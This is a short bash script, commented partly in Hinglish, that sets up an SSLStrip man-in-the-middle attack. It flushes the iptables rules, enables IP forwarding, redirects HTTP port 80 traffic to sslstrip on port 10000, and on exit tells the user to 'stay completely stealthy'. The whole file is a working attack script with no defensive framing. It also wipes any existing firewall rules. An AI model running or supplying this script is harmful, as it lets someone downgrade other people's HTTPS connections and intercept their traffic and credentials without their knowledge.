#!/bin/bash

echo "[*] Flushing old iptables rules..."
iptables --flush
iptables -t nat --flush

echo "[+] Enabling IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[+] Routing HTTP traffic to SSLStrip (Port 10000)..."
# Ye rule port 80 ke traffic ko port 10000 par redirect karta hai jahan sslstrip chalega
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

echo "[+] Starting SSLStrip on Port 10000..."
echo "[!] Press Ctrl+C to stop SSLStrip and reset rules."

# Run sslstrip
sslstrip -l 10000

# Jab tum Ctrl+C dabaoge, toh ye niche wali commands chalengi (Cleanup)
echo "\n[*] Cleaning up and resetting iptables..."
iptables --flush
iptables -t nat --flush
echo 0 > /proc/sys/net/ipv4/ip_forward
echo "[+] Done. Stay completely stealthy!"
